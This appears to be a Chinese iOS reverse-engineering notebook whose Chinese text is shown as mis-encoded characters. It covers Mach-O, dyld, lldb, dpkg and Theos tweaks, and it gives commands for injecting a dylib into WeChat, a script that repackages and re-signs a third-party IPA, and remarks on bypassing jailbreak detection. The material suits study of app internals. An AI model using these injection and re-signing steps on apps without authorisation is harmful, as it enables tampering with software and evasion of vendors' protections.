---- __Data/__TEXT åŒ…å«Segement / Section

```
åœ¨å·¥ç¨‹ç¼–è¯‘æ—¶ , æ‰€äº§ç”Ÿçš„ Mach-O å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä¼šé¢„ç•™å‡ºä¸€æ®µç©ºé—´ , 
è¿™ä¸ªç©ºé—´å…¶å®å°±æ˜¯ç¬¦å·è¡¨ , å­˜æ”¾åœ¨ _DATA æ•°æ®æ®µä¸­  ( å› ä¸º _DATA æ®µåœ¨è¿è¡Œæ—¶æ˜¯å¯è¯»å¯å†™çš„ ) 

ç¼–è¯‘æ—¶ : å·¥ç¨‹ä¸­æ‰€æœ‰å¼•ç”¨äº†å…±äº«ç¼“å­˜åŒºä¸­çš„ç³»ç»Ÿåº“æ–¹æ³• , å…¶æŒ‡å‘çš„åœ°å€è®¾ç½®æˆç¬¦å·åœ°å€ ,  
( ä¾‹å¦‚å·¥ç¨‹ä¸­æœ‰ä¸€ä¸ª NSLog , é‚£ä¹ˆç¼–è¯‘æ—¶å°±ä¼šåœ¨ Mach-O ä¸­åˆ›å»ºä¸€ä¸ª NSLog çš„ç¬¦å· , å·¥ç¨‹ä¸­çš„ NSLog å°±æŒ‡å‘è¿™ä¸ªç¬¦å· ) 

è¿è¡Œæ—¶ : å½“ dyldå°†åº”ç”¨è¿›ç¨‹åŠ è½½åˆ°å†…å­˜ä¸­æ—¶ , æ ¹æ® load commands ä¸­åˆ—å‡ºçš„éœ€è¦åŠ è½½å“ªäº›åº“æ–‡ä»¶ , å»åšç»‘å®šçš„æ“ä½œ 
( ä»¥ NSLog ä¸ºä¾‹ , dyld å°±ä¼šå»æ‰¾åˆ° Foundation ä¸­ NSLog çš„çœŸå®åœ°å€å†™åˆ° _DATA æ®µçš„ç¬¦å·è¡¨ä¸­ NSLog çš„ç¬¦å·ä¸Šé¢ )
```
                   
## hook iOS App
### 1. åˆ©ç”¨ä»£ç æ³¨å…¥
1. .framework
ä¸‹è½½yololib
å°†å…¶å¤åˆ¶åˆ° usr/local/bin ä¸­ 
æ‰‹åŠ¨ cd åˆ°Mach-O æ–‡ä»¶è¿™ä¸ªç›®å½•(eg. XLsn0w.framework)
```
yololib Wechat Frameworks/XLsn0w.framework/XLsn0w
```

2. .dylib (eg. XLsn0w.dylib)
```
yololib "$TARGET_APP_PATH/$APP_BINARY" "Frameworks/XLsn0w.dylib"
```

### 2. æ±‡ç¼–ä¿®æ”¹Mach-O
ä¿®æ”¹ Mach-O æ–‡ä»¶çš„ Load Commands

## Shell (.shè„šæœ¬)
```
# ${SRCROOT} å®ƒæ˜¯å·¥ç¨‹æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•
TEMP_PATH="${SRCROOT}/Temp"
#èµ„æºæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬æå‰åœ¨å·¥ç¨‹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªAPPæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ipaåŒ…
ASSETS_PATH="${SRCROOT}/APP"
#ç›®æ ‡ipaåŒ…è·¯å¾„
TARGET_IPA_PATH="${ASSETS_PATH}/*.ipa"
#æ¸…ç©ºTempæ–‡ä»¶å¤¹
rm -rf "${SRCROOT}/Temp"
mkdir -p "${SRCROOT}/Temp"



#----------------------------------------
# 1. è§£å‹IPAåˆ°Tempä¸‹
unzip -oqq "$TARGET_IPA_PATH" -d "$TEMP_PATH"
# æ‹¿åˆ°è§£å‹çš„ä¸´æ—¶çš„APPçš„è·¯å¾„
TEMP_APP_PATH=$(set -- "$TEMP_PATH/Payload/"*.app;echo "$1")
# echo "è·¯å¾„æ˜¯:$TEMP_APP_PATH"


#----------------------------------------
# 2. å°†è§£å‹å‡ºæ¥çš„.appæ‹·è´è¿›å…¥å·¥ç¨‹ä¸‹
# BUILT_PRODUCTS_DIR å·¥ç¨‹ç”Ÿæˆçš„APPåŒ…çš„è·¯å¾„
# TARGET_NAME targetåç§°
TARGET_APP_PATH="$BUILT_PRODUCTS_DIR/$TARGET_NAME.app"
echo "appè·¯å¾„:$TARGET_APP_PATH"

rm -rf "$TARGET_APP_PATH"
mkdir -p "$TARGET_APP_PATH"
cp -rf "$TEMP_APP_PATH/" "$TARGET_APP_PATH"



#----------------------------------------
# 3. åˆ é™¤extensionå’ŒWatchAPP.ä¸ªäººè¯ä¹¦æ²¡æ³•ç­¾åExtention
rm -rf "$TARGET_APP_PATH/PlugIns"
rm -rf "$TARGET_APP_PATH/Watch"



#----------------------------------------
# 4. æ›´æ–°info.plistæ–‡ä»¶ CFBundleIdentifier
#  è®¾ç½®:"Set : KEY Value" "ç›®æ ‡æ–‡ä»¶è·¯å¾„"
/usr/libexec/PlistBuddy -c "Set :CFBundleIdentifier $PRODUCT_BUNDLE_IDENTIFIER" "$TARGET_APP_PATH/Info.plist"


#----------------------------------------
# 5. ç»™MachOæ–‡ä»¶ä¸Šæ‰§è¡Œæƒé™
# æ‹¿åˆ°MachOæ–‡ä»¶çš„è·¯å¾„WeChat
APP_BINARY=`plutil -convert xml1 -o - $TARGET_APP_PATH/Info.plist|grep -A1 Exec|tail -n1|cut -f2 -d\>|cut -f1 -d\<`
#ä¸Šå¯æ‰§è¡Œæƒé™
chmod +x "$TARGET_APP_PATH/$APP_BINARY"



#----------------------------------------
# 6. é‡ç­¾åç¬¬ä¸‰æ–¹ FrameWorks
TARGET_APP_FRAMEWORKS_PATH="$TARGET_APP_PATH/Frameworks"
if [ -d "$TARGET_APP_FRAMEWORKS_PATH" ];
then
for FRAMEWORK in "$TARGET_APP_FRAMEWORKS_PATH/"*
do


#ç­¾å
/usr/bin/codesign --force --sign "$EXPANDED_CODE_SIGN_IDENTITY" "$FRAMEWORK"
done
fi

```

## Tagged Pointer

1ï¸âƒ£ : Tagged Pointer ä¸“é—¨ç”¨æ¥å­˜å‚¨å°çš„å¯¹è±¡ï¼Œä¾‹å¦‚ NSNumber å’Œ NSDate

2ï¸âƒ£ : Tagged Pointer æŒ‡é’ˆçš„å€¼ä¸å†æ˜¯åœ°å€äº†ï¼Œè€Œæ˜¯çœŸæ­£çš„å€¼ã€‚æ‰€ä»¥ï¼Œå®é™…ä¸Šå®ƒä¸å†æ˜¯ä¸€ä¸ªå¯¹è±¡äº†ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªæŠ«ç€å¯¹è±¡çš®çš„æ™®é€šå˜é‡è€Œå·²ã€‚æ‰€ä»¥ï¼Œå®ƒçš„å†…å­˜å¹¶ä¸å­˜å‚¨åœ¨å †ä¸­ï¼Œä¹Ÿä¸éœ€è¦ malloc å’Œ free

3ï¸âƒ£ :  åœ¨å†…å­˜è¯»å–ä¸Šæœ‰ç€ 3 å€çš„æ•ˆç‡ï¼Œåˆ›å»ºæ—¶æ¯”ä»¥å‰å¿« 106 å€ ( objc_msgSend èƒ½è¯†åˆ« Tagged Pointerï¼Œæ¯”å¦‚ NSNumber çš„ intValue æ–¹æ³•ï¼Œç›´æ¥ä»æŒ‡é’ˆæå–æ•°æ® )

4ï¸âƒ£ : ä½¿ç”¨ Tagged Pointer åï¼ŒæŒ‡é’ˆå†…å­˜å‚¨çš„æ•°æ®å˜æˆäº† Tag + Dataï¼Œä¹Ÿå°±æ˜¯å°†æ•°æ®ç›´æ¥å­˜å‚¨åœ¨äº†æŒ‡é’ˆä¸­ .

## lldb po
p æ˜¯ expr -çš„ç¼©å†™ã€‚å®ƒçš„å·¥ä½œæ˜¯æŠŠæ¥æ”¶åˆ°çš„å‚æ•°åœ¨å½“å‰ç¯å¢ƒä¸‹è¿›è¡Œç¼–è¯‘ï¼Œç„¶åæ‰“å°å‡ºå¯¹åº”çš„å€¼ã€‚

po å³ expr -o-ã€‚å®ƒæ‰€åšçš„æ“ä½œä¸pç›¸åŒã€‚å¦‚æœæ¥æ”¶åˆ°çš„å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œé‚£ä¹ˆå®ƒä¼šè°ƒç”¨å¯¹è±¡çš„ description æ–¹æ³•å¹¶æ‰“å°ã€‚å¦‚æœæ¥æ”¶åˆ°çš„å‚æ•°æ˜¯ä¸€ä¸ª core foundation å¯¹è±¡ï¼Œé‚£ä¹ˆå®ƒä¼šè°ƒç”¨ CFShow æ–¹æ³•å¹¶æ‰“å°ã€‚å¦‚æœè¿™ä¸¤ä¸ªæ–¹æ³•éƒ½è°ƒç”¨å¤±è´¥ï¼Œé‚£ä¹ˆ po æ‰“å°å‡ºå’Œ p ç›¸åŒçš„å†…å®¹ã€‚

æ€»çš„æ¥è¯´ï¼Œpo ç›¸å¯¹äº p ä¼šæ‰“å°å‡ºæ›´å¤šå†…å®¹ã€‚ä¸€èˆ¬åœ¨å·¥ä½œä¸­ï¼Œç”¨ p å³å¯ï¼Œå› ä¸º p æ“ä½œè¾ƒå°‘ï¼Œæ•ˆç‡æ›´é«˜ã€‚

på³æ˜¯printï¼Œä¹Ÿæ˜¯expression --çš„ç¼©å†™ï¼Œä¸poä¸åŒï¼Œå®ƒä¸ä¼šæ‰“å‡ºå¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œåªä¼šæ‰“å°å‡ºä¸€ä¸ª$ç¬¦å·ï¼Œæ•°å­—ï¼Œå†åŠ ä¸Šä¸€æ®µåœ°å€ä¿¡æ¯ã€‚ç”±äºpoå‘½ä»¤ä¸‹ï¼Œå¯¹è±¡çš„description æœ‰å¯èƒ½è¢«éšä¾¿ä¹±æ”¹ï¼Œæ²¡æœ‰è¾“å‡ºåœ°å€æ¶ˆæ¯ã€‚

$ç¬¦å·åœ¨LLDBä¸­ä»£è¡¨ç€å˜é‡çš„åˆ†é…ã€‚æ¯æ¬¡ä½¿ç”¨påï¼Œä¼šè‡ªåŠ¨ä¸ºä½ åˆ†é…ä¸€ä¸ªå˜é‡ï¼Œåé¢å†æ¬¡æƒ³ä½¿ç”¨è¿™ä¸ªå˜é‡æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªåœ°å€åšä¸€äº›è½¬æ¢ï¼Œè·å–å¯¹è±¡çš„ä¿¡æ¯

## ä»€ä¹ˆæ˜¯ dyld?

dyld æ˜¯è‹¹æœçš„åŠ¨æ€åŠ è½½å™¨ , ç”¨æ¥åŠ è½½ image ( æ³¨æ„: è¿™é‡Œçš„ image ä¸æ˜¯æŒ‡å›¾ç‰‡ , è€Œæ˜¯ Mach-O æ ¼å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶  )

å½“ç¨‹åºå¯åŠ¨æ—¶ , ç³»ç»Ÿå†…æ ¸ä¼šé¦–å…ˆåŠ è½½ dyld , è€Œ dyld ä¼šå°†æˆ‘ä»¬çš„ APP æ‰€ä¾èµ–çš„å„ç§åº“åŠ è½½åˆ°å†…å­˜ä¸­ ,
å…¶ä¸­å°±åŒ…æ‹¬ libobjc ( OC å’Œ runtime ) , è¿™äº›å·¥ä½œæ˜¯åœ¨ APP çš„ main å‡½æ•°æ‰§è¡Œä¹‹å‰å®Œæˆçš„.

_objc_init æ˜¯ Object-C - runtime åº“çš„å…¥å£å‡½æ•° , åœ¨è¿™é‡Œä¸»è¦æ˜¯è¯»å– Mach-O æ–‡ä»¶ OC å¯¹åº”çš„ Segment section , 
å¹¶æ ¹æ®å…¶ä¸­çš„æ•°æ®ä»£ç ä¿¡æ¯ , å®Œæˆä¸º OC çš„å†…å­˜å¸ƒå±€ , ä»¥åŠåˆå§‹åŒ– runtime ç›¸å…³çš„æ•°æ®ç»“æ„.

## dpkg-deb
```
1ã€dpkg-deb -x ./original.deb ./repackage
2ã€å¾—åˆ°å¤´æ–‡ä»¶class-dump -H original.app -o ./header
 
ä½†å¦‚æœå¯¹å…¶é€†å‘ï¼Œä¿®æ”¹åï¼Œè¦é‡æ–°æ‰“åŒ…ï¼Œåˆ™æ­¥éª¤å¦‚ä¸‹ï¼š
1ã€å»ºç«‹æ–‡ä»¶å¤¹ç›®å½•
./repackage/DEBIAN
 
2ã€æ‹†åŒ…
dpkg-deb -x ./original.deb ./repackage
æ‰§è¡Œä¹‹åï¼Œç›®å½•ç»“æ„ä¸ºï¼š
./repackage/DEBIAN
./repackage/Applications
./repackage/Library
./repackage/usr
 
3ã€å¾—åˆ°åŸdebä¿¡æ¯
dpkg-deb -e ./original.deb repackage/DEBIAN
åœ¨DEBIANç›®å½•ä¸‹ä¼šå¾—åˆ°åŒ…å«controlç­‰5ä¸ªæ–‡ä»¶
 
4ã€æ‰“åŒ…
dpkg-deb -b repackage new.deb

```

## dpkg

å®‰è£…deb -i == -install
```
$ dpkg -i cn.xlsn0w.deb
```

å¸è½½deb -r == -remove
```
$ dpkg -r cn.xlsn0w.deb
```

æŸ¥çœ‹debä¿¡æ¯ -s == -see
```
$ dpkg -s cn.xlsn0w.deb 
```

## iOSå¤§ç¥é‡‘å­—å¡”
1.OCåŸºç¡€ã€UIå±‚ï¼šç†Ÿç»ƒæŒæ¡å„ç§ç»„ä»¶çš„ä¸šåŠ¡å¼€å‘

2.runloopã€runtimeå±‚ï¼šç†Ÿç»ƒæŒæ¡OCå®ç°åŸç†ï¼Œå®šä½å„ç§å¼‚å¸¸é—®é¢˜

3.æºç å±‚ï¼šOCåº•å±‚æºç ã€æ¯”å¦‚objcã€GNUStep ç­‰æºç ï¼Œä»åº•å±‚åŸç†ä¸Šåˆ†æé—®é¢˜ï¼Œè§£å†³é—®é¢˜

4.æ±‡ç¼–å±‚ï¼šç†Ÿæ‚‰OCåœ¨æœºå™¨ç å±‚é¢å®ç°ï¼Œä¾‹å¦‚å¯„å­˜å™¨ã€æ±‡ç¼–ã€Mach-Oç­‰

5.ç³»ç»Ÿå±‚ï¼šå­¦ä¹ Drawinç³»ç»Ÿã€BSDç­‰

6.çŸ¥è¯†é¢çš„æ‹“å®½ï¼šAndroidã€flutterã€swiftã€shellã€rubyã€è„šæœ¬ç­‰

7.ç¡¬ä»¶å±‚ï¼šæ¯”å¦‚è¯´é›†æˆç”µè·¯ã€æ“ä½œç³»ç»Ÿå¦‚ä½•è¿è½¬ç­‰ç­‰

## usbmuxd
usbmuxdå°†ä¾èµ–äºTCP/IPçš„å‘½ä»¤çš„è¢«è¿æ¥æ–¹ï¼Œé€šè¿‡æœ¬åœ°ç«¯å£æ˜ å°„ã€‚

ç”¨usbè¿æ¥ä»£æ›¿äº†ç½‘ç»œè¿æ¥ï¼Œä½¿å¾—åœ¨æ²¡æœ‰ç½‘ç»œçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥è¿æ¥è®¾å¤‡ã€‚

$  iproxy 2222 22 == å°†æœ¬åœ°ç”µè„‘2222ç«¯å£è½¬å‘åˆ°usbè¿æ¥è®¾å¤‡22ç«¯å£

### Makefile
```
DEBUG = false

THEOS_DEVICE_IP = localhost
THEOS_DEVICE_PORT = 2222

ARCHS = arm64 arm64e

TARGET = iphone:latest:11.0

THEOS_MAKE_PATH = /opt/theos/makefiles

include $(THEOS)/makefiles/common.mk

TWEAK_NAME = XLsn0wTweak

XLsn0wTweak_FILES = Tweak.xm

include $(THEOS_MAKE_PATH)/tweak.mk

after-install::
	install.exec "killall -9 SpringBoard"

```

1.è®¾å¤‡å®‰è£…openSSHæ’ä»¶, å®‰è£…usbmuxd(brew install usbmuxd)
2.æŠŠå½“å‰è¿æ¥è®¾å¤‡çš„22ç«¯å£(SSHç«¯å£)æ˜ å°„åˆ°ç”µè„‘çš„2222ç«¯å£:(iproxy 2222 22)
3.theosæƒ³å’Œè®¾å¤‡22ç«¯å£é€šä¿¡ï¼Œç›´æ¥å’Œæœ¬åœ°çš„2222ç«¯å£é€šä¿¡å³å¯
```
iproxy 2222 22 
```

### sshè¿æ¥è®¾å¤‡IP==è¿æ¥ç”µè„‘æœ¬åœ°localhost 127.0.0.1
```
ssh -p 2222 root@127.0.0.1

ssh root@localhost -p 22222
```

## dpkg -r packageName å¸è½½debæ’ä»¶
1. sshè¿æ¥æ‰‹æœº(ssh -p 2222 root@127.0.0.1)
2. ä½¿ç”¨dpkg -r packageName (packageNameæ˜¯åˆ›å»ºTweaké¡¹ç›®æ—¶è¾“å…¥çš„åŒ…å)
3. æ³¨é”€SpringBoard 

```
iPhone-6:~ root# dpkg -r cn.xlsn0w.dock:iphoneos-arm
(Reading database ... 1896 files and directories currently installed.)
Removing cn.xlsn0w.dock (1.1.6-2) ...
```

### æ‰§è¡Œmake installå‘½ä»¤å®‰è£…debæ’ä»¶
```
$     make install
==> Installingâ€¦
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
RSA key fingerprint is SHA256:9BPzMfuq0HFe2lkxXBRpdZSwg+if/NSbn1m2+7RudqM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.
Selecting previously unselected package cn.xlsn0w.dock.
(Reading database ... 3893 files and directories currently installed.)
Preparing to unpack /tmp/_theos_install.deb ...
Unpacking cn.xlsn0w.dock (1.1.5-4) ...
Setting up cn.xlsn0w.dock (1.1.5-4) ...
install.exec "killall -9 SpringBoard"
```
![iPod touch4](https://github.com/XLsn0w/Cydia/blob/master/iOS%206.1.6%20jailbreak.JPG?raw=true)

## .appæ‰‹åŠ¨å‹ç¼©æ”¹åç¼€.ipa
```
1: æ–°å»ºâ€œPayloadâ€æ–‡ä»¶å¤¹;
2: å°†.appåŒ…æ”¾åˆ°Payloadä¸­;
3: åœ¨Payloadæ–‡ä»¶å¤¹ä¸Šå³é”®å‹ç¼©æˆzipï¼Œç„¶åå°†ç”Ÿæˆçš„.zipæ–‡ä»¶åç¼€æ”¹æˆ.ipaå³å¯
```

## macOS/iOS ç­¾åå·¥å…·
```
$ brew install ldid
```
 ### ldidå·¥å…·ï¼šldidæ˜¯macä¸Šçš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥ç”¨äºå¯¼å‡ºçš„ç­¾åæ–‡ä»¶ã€å¯¹æ–‡ä»¶è¿›è¡Œé‡ç­¾åç­‰æ“ä½œã€‚
 ### codesignå·¥å…·ï¼šMacä¸Šçš„å‘½ä»¤è¡Œå·¥å…·ã€ä¹Ÿå¯ä»¥ç”¨äºæƒé™ç­¾åæ“ä½œã€‚

### dlopen å’Œ dlsym æ–¹æ³•åŠ¨æ€åŠ è½½åº“å’Œè°ƒç”¨å‡½æ•°
### Linux/unix/macOS/iOS æä¾›äº†ä½¿ç”¨ dlopen å’Œ dlsym æ–¹æ³•åŠ¨æ€åŠ è½½åº“å’Œè°ƒç”¨å‡½æ•°

UNIX è¯ç”Ÿäº 20 ä¸–çºª 60 å¹´ä»£æœ«ï¼Œ
Windows è¯ç”Ÿäº 20 ä¸–çºª 80 å¹´ä»£ä¸­æœŸï¼Œ
Linux è¯ç”Ÿäº 20 ä¸–çºª 90 å¹´ä»£åˆï¼Œ
å¯ä»¥è¯´ UNIX æ˜¯æ“ä½œç³»ç»Ÿä¸­çš„"è€å¤§å“¥", Windows å’Œ Linux éƒ½å‚è€ƒäº† UNIXã€‚

dlopen æ‰“å¼€ä¸€ä¸ªåº“ï¼Œè·å–å¥æŸ„ã€‚
dlsym åœ¨æ‰“å¼€çš„åº“ä¸­æŸ¥æ‰¾ç¬¦å·çš„å€¼ã€‚
dlclose å…³é—­å¥æŸ„ã€‚
dlerror è¿”å›ä¸€ä¸ªæè¿°æœ€åä¸€æ¬¡è°ƒç”¨dlopenã€dlsymï¼Œæˆ– dlclose çš„é”™è¯¯ä¿¡æ¯çš„å­—ç¬¦ä¸²ã€‚

## Makefile
Makefileå…³ç³»åˆ°äº†æ•´ä¸ªå·¥ç¨‹çš„ç¼–è¯‘è§„åˆ™ã€‚ä¸€ä¸ªå·¥ç¨‹ä¸­çš„æºæ–‡ä»¶ä¸è®¡æ•°ï¼Œå…¶æŒ‰ç±»å‹ã€åŠŸèƒ½ã€æ¨¡å—åˆ†åˆ«æ”¾åœ¨è‹¥å¹²ä¸ªç›®å½•ä¸­ï¼Œ
Makefileå®šä¹‰äº†ä¸€ç³»åˆ—çš„è§„åˆ™æ¥æŒ‡å®šï¼Œå“ªäº›æ–‡ä»¶éœ€è¦å…ˆç¼–è¯‘ï¼Œå“ªäº›æ–‡ä»¶éœ€è¦åç¼–è¯‘ï¼Œå“ªäº›æ–‡ä»¶éœ€è¦é‡æ–°ç¼–è¯‘ï¼Œç”šè‡³äºè¿›è¡Œæ›´å¤æ‚çš„åŠŸèƒ½æ“ä½œï¼Œ
å› ä¸ºmakefileå°±åƒä¸€ä¸ªShellè„šæœ¬ä¸€æ ·ï¼Œå…¶ä¸­ä¹Ÿå¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„å‘½ä»¤ã€‚

makefileå¸¦æ¥çš„å¥½å¤„å°±æ˜¯â€”â€”â€œè‡ªåŠ¨åŒ–ç¼–è¯‘â€ï¼Œä¸€æ—¦å†™å¥½ï¼Œåªéœ€è¦ä¸€ä¸ªmakeå‘½ä»¤ï¼Œæ•´ä¸ªå·¥ç¨‹å®Œå…¨è‡ªåŠ¨ç¼–è¯‘ï¼Œæå¤§çš„æé«˜äº†è½¯ä»¶å¼€å‘çš„æ•ˆç‡ã€‚
makeæ˜¯ä¸€ä¸ªå‘½ä»¤å·¥å…·ï¼Œæ˜¯ä¸€ä¸ªè§£é‡Šmakefileä¸­æŒ‡ä»¤çš„å‘½ä»¤å·¥å…·ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå¤§å¤šæ•°çš„IDEéƒ½æœ‰è¿™ä¸ªå‘½ä»¤ï¼Œæ¯”å¦‚ï¼šDelphiçš„makeï¼ŒVisual C++çš„nmakeï¼ŒLinuxä¸‹GNUçš„makeã€‚
å¯è§ï¼Œmakefileéƒ½æˆä¸ºäº†ä¸€ç§åœ¨å·¥ç¨‹æ–¹é¢çš„ç¼–è¯‘æ–¹æ³•ã€‚

## ç»•è¿‡è¶Šç‹±æ£€æµ‹
æœ€è¿‘ï¼Œè‹¹æœè‡ªå·±çš„App Storeä¸­æœ‰ç›¸å½“æ•°é‡çš„åº”ç”¨ç¨‹åºæ­£åœ¨å®æ–½ä¸€äº›ç¨‹åºï¼Œä»¥æ£€æŸ¥è¿è¡Œè¯¥åº”ç”¨ç¨‹åºæœ¬èº«çš„è®¾å¤‡çš„çœŸå®æ€§ï¼Œä»è€Œç¦æ­¢æˆ–ç¦æ­¢æŸäº›åŠŸèƒ½ç”šè‡³æ˜¯æ•´ä¸ªåº”ç”¨ç¨‹åºçš„ä½¿ç”¨ã€‚
æ˜¾è€Œæ˜“è§çš„åŸå› æ˜¯è¶Šç‹±çš„å…ˆå¤©å®‰å…¨é£é™©æ‚¨çš„è®¾å¤‡ï¼ˆä¾‹å¦‚ï¼Œé“¶è¡Œå…¬å¸ä¸å¸Œæœ›å°†æŸäº›æµæ°“é”®ç›˜è®°å½•ç¨‹åºä¼ªè£…æˆå¯¹æ‚¨çš„å¸æˆ·ä¿¡æ¯çš„è°ƒæ•´æ¥ä¼ªè£…ï¼‰ã€‚

ä½†æ˜¯ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå…¬å¸ä¼¼ä¹æ‹…å¿ƒè°ƒæ•´å¯èƒ½ä¼šç»•è¿‡åº”ç”¨ç¨‹åºä¸­å®æ–½çš„æŸäº›é™åˆ¶ã€‚è§†é¢‘æµåº”ç”¨ä¸ºæ­¤è€Œè‡­åæ˜­è‘—ã€‚è¿™äº›å…¬å¸ä¸å¸Œæœ›ç”¨æˆ·ç»•è¿‡å¯¹ä½•æ—¶ä½•åœ°å¯ä»¥æµå¼ä¼ è¾“å…¶å†…å®¹çš„é™åˆ¶ï¼Œ
å› æ­¤ï¼Œä»–ä»¬æ²¡æœ‰åšè´Ÿè´£ä»»çš„äº‹æƒ…å¹¶æ··æ·†äº†ä»–ä»¬çš„é™åˆ¶å°è¯•ï¼Œè€Œæ˜¯é˜»æ­¢äº†æ‰€æœ‰è¶Šç‹±è®¾å¤‡ï¼Œæ— è®ºå®ƒä»¬æ˜¯å¦å‡ºäºæ¶æ„æˆ–ç¼ºä¹æ„å›¾ã€‚

## Kernel Syscalls -> https://www.theiphonewiki.com/wiki/Kernel_Syscalls
```
åƒå¾€å¸¸ä¸€æ ·ï¼ŒArgsè¿›å…¥å…¶æ™®é€šå¯„å­˜å™¨ï¼Œå¦‚R0 / X0ä¸­çš„arg1ã€‚Syscallï¼ƒè¾“å…¥IPï¼ˆå³è¿‡ç¨‹å†…çš„ï¼Œè€Œä¸æ˜¯æŒ‡ä»¤æŒ‡é’ˆï¼ï¼‰ï¼Œä¹Ÿç§°ä¸ºR12 / X16ã€‚

åƒåœ¨æ‰€æœ‰ARMä¸­ä¸€æ ·ï¼ˆåœ¨Androidä¸­ä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ï¼Œå†…æ ¸æ¡ç›®æ˜¯ç”±SVCå‘½ä»¤ï¼ˆæŸäº›è°ƒè¯•å™¨å’ŒARMæ–¹è¨€ä¸­çš„SWIï¼‰å®Œæˆçš„ã€‚åœ¨å†…æ ¸ç«¯ï¼Œä½œä¸ºExceptionVectorsBaseçš„ä¸€éƒ¨åˆ†å®‰è£…äº†ä¸€ä¸ªä½çº§CPUå¼‚å¸¸å¤„ç†ç¨‹åºï¼ˆfleh_swiï¼‰ï¼Œå¹¶ä¸”-åœ¨å‘å‡ºSWI / SVCæ—¶-æ§ä»¶è¢«è½¬ç§»åˆ°è¯¥åœ°å€ã€‚è¯¥å¤„ç†ç¨‹åºå¯ä»¥æ£€æŸ¥ç³»ç»Ÿè°ƒç”¨å·ï¼Œä»¥åŒºåˆ†POSIXè°ƒç”¨ï¼ˆéå¦å®šï¼‰å’ŒMaché™·é˜±ï¼ˆå¦å®šï¼‰ã€‚

Args go in their normal registers, like arg1 in R0/X0, as usual. Syscall # goes in IP (that's intra-procedural, not instruction pointer!), a.k.a R12/X16.

As in all ARM (i.e. also on Android) the kernel entry is accomplished by the SVC command (SWI in some debuggers and ARM dialects). On the kernel end, a low level CPU exception handler (fleh_swi) is installed as part of the ExceptionVectorsBase, and - upon issuing a SWI/SVC - control is transferred to that address. This handler can check the syscall number to distinguish between POSIX calls (non negative) and Mach traps (negative).

Unix
Usage
MOV IP, #x // number from following list into Intraprocedural, a.k.a. r12 on arm32 and x16 on arm64
SVC 0x80   // Formerly, SWI (software interrupt)
For example, arm32:


(gdb) disass chown
0x30d2ad54 <chown>:	mov	r12, #16	       ; 0x10, being # of chown
0x30d2ad58 <chown+4>:	svc	0x00000080
And arm64:

libsystem_kernel.dylib`chown:
    0x1866c6084 <+0>:  mov    x16, #0x10
    0x1866c6088 <+4>:  svc    #0x80
Most of these are the same as you would find in the XNU open source kernel, with ARM idiosyncrasies aside (and #372, ledger)

XNUä¸­çš„ç³»ç»Ÿè°ƒç”¨è¡¨è¢«ç§°ä¸ºâ€œ sysentâ€ï¼Œå‡ºäºæ˜æ˜¾çš„åŸå› ï¼ˆä¾‹å¦‚syscallæŒ‚é’©ï¼‰ï¼Œå®ƒä¸å†æ˜¯å…¬å…±ç¬¦å·ã€‚ä½†æ˜¯ï¼Œæ‰¾åˆ°ç³»ç»ŸåŠå…¶è°ƒç”¨éå¸¸ç®€å•ã€‚å°½ç®¡i0nicæå‡ºäº†ä¸€ç§åŸºäºå¯¼å‡ºçš„kdebugç¬¦å·æŸ¥æ‰¾ç³»ç»Ÿçš„å¯å‘å¼æ–¹æ³•ï¼Œä½†è¿™æ˜¯ä¸å¯é çš„ï¼Œå› ä¸ºè¯¥ç¬¦å·ä¸å†è¢«å¯¼å‡ºã€‚æ›´å¥½çš„æ–¹æ³•æ˜¯è¿›å…¥struct sysentæ¡ç›®æœ¬èº«çš„æ¨¡å¼ï¼Œå³-å¦‚bsd / sys / sysent.hä¸­æ‰€å®šä¹‰ï¼š
sysent
The system call table in XNU is known as "sysent", and is no longer a public symbol, for obvious reasons (e.g. syscall hooking). It is fairly straightforward, however, to find the sysent and its calls. While i0nic proposes a heuristic of finding the sysent based on the exported kdebug symbol, this is unreliable, as the symbol is no longer exported. A better way is to home in on the pattern of the struct sysent entries itself, i.e - as defined in bsd/sys/sysent.h:


struct sysent {         /* system call table */
        int16_t         sy_narg;        /* number of args */
        int8_t          sy_resv;        /* reserved  */
        int8_t          sy_flags;       /* flags */
        sy_call_t       *sy_call;       /* implementing function */
        sy_munge_t      *sy_arg_munge32; /* system call arguments munger for 32-bit process */
        sy_munge_t      *sy_arg_munge64; /* system call arguments munger for 64-bit process */
        int32_t         sy_return_type; /* system call return types */
        uint16_t        sy_arg_bytes;   /* Total size of arguments in bytes for
                                         * 32-bit system calls
                                         */
};

Because system calls arguments are set in stone, it is straightforward to write code to find the signature of the first few syscalls (syscall, exit, fork..), and from there calculate the other sysent entries. A program to do so reliable on iOS has, in fact, been written, and produces the following output for iOS 6.0b1:

List of system calls from iOS 6.0 GM
note: Even though a syscall is present in the table, it does not in any way imply it is functional. Auditing, for example, is not enabled in iOS (no CONFIG_AUDIT in the XNU build). Most of these syscalls are the same as those of OS X, with the exception of ledger (which actually makes a comeback in OS X Mountain Lion), and 434+ (CONFIG_EMBEDDED).

A good reference on these can be found at Wiley's OS X and iOS Internals online appendix. The joker tool (shown below) can be downloaded from the same site.

$ joker -u ~/Documents/projects/iOS.6.0.iPod4.kernel 
This is an ARM binary. Applying iOS kernel signatures
Entry point is 0x80085084....This appears to be XNU 2107.2.33
Syscall names are @2a70f0
Sysent offset in file/memory (for patching purposes): 0x2ef0c0/0x802f00c0

Suppressing enosys (0x800b3429)  T = Thumb
1. exit                  801d4a74 T
